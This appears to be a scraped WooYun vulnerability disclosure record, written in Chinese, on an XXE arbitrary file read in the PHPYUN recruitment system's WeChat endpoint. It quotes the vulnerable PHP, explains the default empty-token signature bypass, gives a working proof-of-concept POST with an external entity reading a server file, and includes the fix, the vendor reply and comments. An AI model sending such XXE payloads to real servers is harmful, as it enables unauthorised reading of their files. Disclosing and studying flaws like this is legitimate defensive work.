{"id": 1480, "wybug_id": "wooyun-2014-064637", "wybug_title": "PHPYUN最新版任意文件读取漏洞", "wybug_corp": "php云人才系统", "wybug_author": "xfkxfk", "wybug_date": "2014-06-12 14:54", "wybug_open_date": "2014-09-10 14:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向公众公开  简要描述： PHPYUN最新版任意问价你读取漏洞，第一次遇到这种漏洞哦！！！ 详细说明：  刚刚研究了下二哥的XML实体注入： WooYun: 百度某功能XML实体注入 感觉好高大上哦，从来没遇到过，这几天看PHPYUN，突然想到了这个问题。文件weixin/model/index.class.php\npublic function index_action()\t{\t\tif($_GET[\"echostr\"])\t\t{\t\t\t$this->valid();\t\t}else{\t\t\t\t\t\tif(!$this->checkSignature()){echo \"非法来源地址！\";exit();};\t\t\t$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];\t\t\tif (!empty($postStr))\t\t\t{\t\t\t  $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);  \t\t\t  $fromUsername = $postObj->FromUserName;\t\t\t  $toUsername = $postObj->ToUserName;\t\t\t  $keyword = trim($postObj->Content);\t\t\t  $times = time();\t\t\t  $MsgType = $postObj->MsgType;\t\t\t \t\t\t  $topTpl = \"<xml>\t\t\t\t   <ToUserName><![CDATA[%s]]></ToUserName>\t\t\t\t   <FromUserName><![CDATA[%s]]></FromUserName>\t\t\t\t   <CreateTime>%s</CreateTime>\t\t\t\t   <MsgType><![CDATA[%s]]></MsgType>\t\t\t\t   \";\t\t\t \t\t\t  $bottomStr = \"<FuncFlag>0</FuncFlag></xml>\";\t\t\t  \t\t\t  if($MsgType=='event')\t\t\t  {\t\t\t\t$MsgEvent = $postObj->Event;\t\t\t\tif ($MsgEvent=='subscribe')\t\t\t\t{\t\t\t\t\t$centerStr = \"<Content><![CDATA[欢迎您关注\".iconv('gbk','utf-8',$this->config['sy_webname']).\"！\\n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位\\n绑定您的账户体验更多精彩功能\\n感谢您的关注！]]></Content>\";\t\t\t\t\t$this->MsgType = 'text';\t\t\t\t}elseif ($MsgEvent=='CLICK')\t\t\t\t{\t\t\t\t\t$EventKey = $postObj->EventKey;\t\t\t\t\tif($EventKey=='我的帐号'){\t\t\t\t\t\t$centerStr = $this->bindUser($fromUsername);\t\t\t\t\t}elseif($EventKey=='我的消息')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->myMsg($fromUsername);\t\t\t\t\t}elseif($EventKey=='面试邀请')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->Audition($fromUsername);\t\t\t\t\t}elseif($EventKey=='简历查看')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->lookResume($fromUsername);\t\t\t\t\t}elseif($EventKey=='刷新简历')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->refResume($fromUsername);\t\t\t\t\t}elseif($EventKey=='推荐职位')\t\t\t\t\t{\t\t\t\t\t\t$centerStr = $this->recJob();\t\t\t\t\t}elseif($EventKey=='职位搜索'){\t\t\t\t\t\t\t\t\t\t\t\t$centerStr = \"<Content><![CDATA[直接回复城市、职位、公司名称等关键字搜索您需要的职位信息。\\n 如：【经理】、【南京 经理】、【南京 xx公司】]]></Content>\";\t\t\t\t\t\t$this->MsgType = 'text';\t\t\t\t\t}\t\t\t\t}\t\t\t  }elseif($MsgType=='text'){\t\t\t\tif($keyword){\t\t\t\t\t\t\t\t\t\t$centerStr = $this->searchJob($keyword);\t\t\t\t}\t\t\t  }\t\t\t \t\t\t  $topStr = sprintf($topTpl, $fromUsername, $toUsername, $times, $this->MsgType);\t\t\t  echo $topStr.$centerStr.$bottomStr;\t\t\t}\t\t}\t}\n这里将$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];通过simplexml_load_string解析后的内容，直接带入了$topTpl：\n$topStr = sprintf($topTpl, $fromUsername, $toUsername, $times, $this->MsgType);\n然而$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];就是直接获取的POST过来的XML内容，没有经过任何处理，最后将其echo出来了。真个过程就是传一个XML的内容进去，然后输出一个XML的内容，那么我们结果XML实体注入不就可以读取服务器上的内容，然后再输出出来么？！实际证明是可行的，见漏洞证明！当然这里有一个问题就是：在入口会检测一个字符串：\npublic function index_action()\t{\t\tif($_GET[\"echostr\"])\t\t{\t\t\t$this->valid();\t\t}else{\t\t\t\t\t\tif(!$this->checkSignature()){echo \"非法来源地址！\";exit();};......private function checkSignature()\t{        $signature = $_GET[\"signature\"];        $timestamp = $_GET[\"timestamp\"];        $nonce = $_GET[\"nonce\"];\t        \t\t\t\t$token = $this->config['wx_token'];\t\t$tmpArr = array($token, $timestamp, $nonce);\t\tsort($tmpArr, SORT_STRING);\t\t$tmpStr = implode( $tmpArr );\t\t$tmpStr = sha1( $tmpStr );\t\t\t\tif( $tmpStr == $signature ){\t\t\treturn true;\t\t}else{\t\t\treturn false;\t\t}\t}\n如果用户设置了wx_token就没办法了，但是这个wx_token默认是空的。所以在默认条件下，没有wx_token时，这个$tmpStr == $signature==da39a3ee5e6b4b0d3255bfef95601890afd80709，这是一个固定的值了，我们是完全可以利用上面的漏洞读入任意文件。   漏洞证明：  读取/phpyun/robots.txt内容发送请求：\nPOST /phpyun/weixin/index.php?m=index&c=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: text/xmlContent-Length: 310<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE copyright [<!ENTITY test SYSTEM \"file:///F:/wwwroot/Apache2/htdocs/phpyun/robots.txt\">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><CreateTime>1402550611</CreateTime><MsgType>123</MsgType><FuncFlag>0</FuncFlag></xml>\n这里要注意：signature=da39a3ee5e6b4b0d3255bfef95601890afd80709Content-Type: text/xml如图：\n\n   修复方案：  默认安装时加上随机wx_token，或者处理输入的内容。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-06-12 15:40 厂商回复： 微信参数不设置确实存在该情况，我们会尽快完善，感谢您的提供，不过360也同步出了该问题，时间还要稍早！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-12 15:04 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  关注大神    \n     2014-06-12 16:15 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @php云人才系统 囧。。。我会告诉你，还有一处么    \n     2014-06-12 17:19 |    \t\tphp云人才系统(乌云厂商)\t\t \n  @xfkxfk 还望告知！谢谢！    \n     2014-06-12 17:40 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @php云人才系统  WooYun: PHPYUN最新版XML注入及SQL注入获取管理员账号（无视任何防御）    \n     2014-09-11 18:30 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  关注大神    \n     2014-11-18 15:37 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  @xfkxfk 问下大神测的那个版本？3.1beta有这个吗？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}